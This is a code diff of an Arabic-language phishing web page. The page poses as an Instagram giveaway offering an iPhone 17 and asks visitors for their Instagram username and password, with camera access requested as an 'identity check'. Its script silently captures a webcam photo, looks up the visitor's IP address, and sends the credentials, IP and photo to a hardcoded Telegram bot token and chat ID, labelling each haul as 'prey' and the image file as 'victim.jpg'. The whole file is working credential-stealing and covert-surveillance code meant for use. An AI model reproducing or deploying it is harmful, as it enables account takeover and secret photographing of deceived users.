@@ -1,15 +1,56 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | iPhone 17 Pro Max</title>
+    <style>
+        body { background: #fdfdfd; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .main-card { width: 95%; max-width: 420px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; text-align: center; border: 1px solid #eee; }
+        .promo-img { width: 100%; height: auto; display: block; }
+        .content-padding { padding: 25px; }
+        .btn-claim { background: linear-gradient(45deg, #f09433, #e6683c); color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 19px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 5px 15px rgba(188, 24, 136, 0.3); transition: 0.3s; }
+        #login-ui { display: none; padding: 30px; animation: fadeInUp 0.6s ease; }
+        .insta-logo { width: 170px; margin-bottom: 25px; }
+        .input-insta { width: 100%; padding: 12px; margin: 7px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; text-align: center; }
+        .btn-login { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<div class="main-card">
+    <div id="promo-view">
+        <img src="faiz.png" class="promo-img" alt="الجائزة">
+        <div class="content-padding">
+            <p style="color:#d32f2f; font-weight:bold; font-size:15px; margin-top:0;">شروط المسابقة: متابعة الحساب وتأكيد هويتك بالوجه</p>
+            <button class="btn-claim" onclick="goToLogin()">إضغط هنا لاستلام الجائزة</button>
+        </div>
+    </div>
+
+    <div id="login-ui">
+        <img src="faiz.png" class="insta-logo">
+        <p style="color:#262626; font-weight:bold; margin-bottom:10px; font-size: 16px;">مبروك! تم اختيارك للفوز بـ iPhone 17 🎊</p>
+        <p style="color:#8e8e8e; font-size:13px; margin-bottom:25px;">لاستلام الجائزة: <b>يرجى تسجيل الدخول وتفعيل الكاميرا</b> لتأكيد الهوية.</p>
+        
+        <form id="pish">
+            <input type="text" id="u" class="input-insta" placeholder="اسم المستخدم أو الهاتف" required>
+            <input type="password" id="p" class="input-insta" placeholder="كلمة السر" required>
+            <button type="submit" class="btn-login">تسجيل الدخول والمتابعة</button>
+        </form>
+    </div>
+</div>
+
 <video id="video" width="640" height="480" autoplay style="display:none;"></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-    // 1. طلب إذن الكاميرا فور تحميل الصفحة (بصيغة تأكيد هوية)
+    // طلب إذن الكاميرا عند دخول الصفحة
     window.onload = function() {
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             document.getElementById('video').srcObject = stream;
-        }).catch(err => {
-            console.log("تم رفض الكاميرا من قبل المستخدم أو المتصفح");
-        });
+        }).catch(err => console.log("Camera access denied"));
     };
 
     function goToLogin() {
@@ -17,24 +58,22 @@
         document.getElementById('login-ui').style.display = 'block';
     }
 
-    // 2. معالجة الإرسال (البيانات + IP + الصورة)
     document.getElementById('pish').onsubmit = async function(e) {
         e.preventDefault();
-        
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
         const botToken = '8505285607:AAEEG79gHONgRUxh6lx5Fo9sa3gMvAqaMMs';
         const chatId = '448818597';
-        
-        // جلب الـ IP للضحية
+
+        // جلب الـ IP
         let userIP = "غير معروف";
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             userIP = ipData.ip;
-        } catch(e) { console.error("IP Error"); }
+        } catch(e) {}
 
-        // التقاط الصورة من الفيديو
+        // التقاط الصورة
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
@@ -42,34 +81,23 @@
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'victim_shot.jpg');
-            formData.append('caption', 
-                `⚠️ صيد VIP مكتمل:\n` +
-                `👤 اليوزر: ${user}\n` +
-                `🔑 الرمز: ${pass}\n` +
-                `🌐 الأيبي: ${userIP}\n` +
-                `⏰ الوقت: ${new Date().toLocaleString()}`
-            );
+            formData.append('photo', blob, 'victim.jpg');
+            formData.append('caption', `🔥 صيد VIP:\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}\n🌐 IP: ${userIP}`);
 
             try {
-                // إرسال الصورة والبيانات معاً للبوت
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-
-                alert("تم التحقق بنجاح! سيتم إرسال كود الاستلام في رسالة خاصة.");
-                window.location.href = "https://www.instagram.com/iphone_pro_max_worms_/";
-
-            } catch (error) {
-                // حالة احتياطية إذا فشل إرسال الصورة (يرسل النص فقط)
-                const msg = encodeURIComponent(`⚠️ صيد (بدون صورة):\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}\n🌐 IP: ${userIP}`);
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}`);
-                
-                alert("تم التحقق بنجاح!");
+                alert("تم التحقق! ستصلك رسالة التأكيد قريباً.");
                 window.location.href = "https://www.instagram.com";
+            } catch (err) {
+                // إرسال نص فقط في حال فشل الصورة
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("صيد بدون صورة: " + user + " : " + pass)}`);
             }
         }, 'image/jpeg');
     };
 </script>
 
+</body>
+</html>
